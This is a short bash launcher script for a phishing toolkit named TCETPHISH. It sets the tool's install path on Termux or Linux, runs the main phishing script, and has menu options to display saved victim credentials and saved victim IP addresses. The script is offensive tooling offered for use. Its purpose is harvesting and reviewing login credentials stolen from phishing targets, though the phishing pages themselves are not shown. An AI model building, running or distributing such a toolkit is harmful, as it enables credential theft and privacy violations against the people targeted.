#!/bin/bash

# https://github.com/EthicalHacker6/TCETPHISH

if [[ $(uname -o) == *'Android'* ]];then
	TCETPHISH_ROOT="/data/data/com.termux/files/usr/opt/TCETPHISH"
else
	export TCETPHISH_ROOT="/opt/TCETPHISH"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run TCETPHISH type \`TCETPHISH\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $TCETPHISH_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $TCETPHISH_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $TCETPHISH_ROOT
	bash ./TCETPHISH.sh
fi
